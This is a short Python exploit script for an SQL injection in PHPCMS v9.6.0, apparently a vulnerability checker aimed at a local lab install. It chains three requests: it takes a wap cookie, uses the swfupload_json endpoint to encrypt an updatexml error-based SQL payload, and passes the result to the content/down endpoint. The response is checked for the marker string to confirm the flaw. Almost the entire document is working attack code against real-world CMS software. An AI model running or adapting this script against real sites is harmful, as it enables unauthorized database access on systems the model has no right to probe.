import requests
import HackRequests

def verify(url):

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    url_once = url + "index.php?m=wap&c=index&a=init&siteid=1"
    try:
        ask = requests.get(url_once, headers=headers, verify=False)

        cookie=ask.cookies.items()[0][1]
        print(cookie)

    except Exception as b:
        print("未知错误：" + str(b))
    userid_flash='userid_flash='+cookie
    try:


        url_once2 = url + "index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=1%*27%20and%20updatexml%281%2Cconcat%280x7e%2C%28select%20left%2812121212,6%29%29%29%2C0x7e%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"
        hack = HackRequests.hackRequests()
        cookie=hack.http(url_once2, post=userid_flash, proxy=('127.0.0.1', '8080'))
        print(cookie.cookies)
        cookie=cookie.cookies['udfBX_att_json']
        print(cookie)
    except Exception as b:
        print("未知错误：" + str(b))

    url_once3=url + "index.php?m=content&c=down&a_k=" + str(cookie)
    print(url_once3)

    try:
        html = requests.post(url_once3,headers=headers)
        print(html.text)
        if '12121212' in html.text:
            print("存在漏洞")
    except Exception as b:
        print("未知错误：" + str(b))


if __name__ == "__main__":
    verify('http://192.168.0.103/phpcms_v9.6.0_UTF8/install_package/')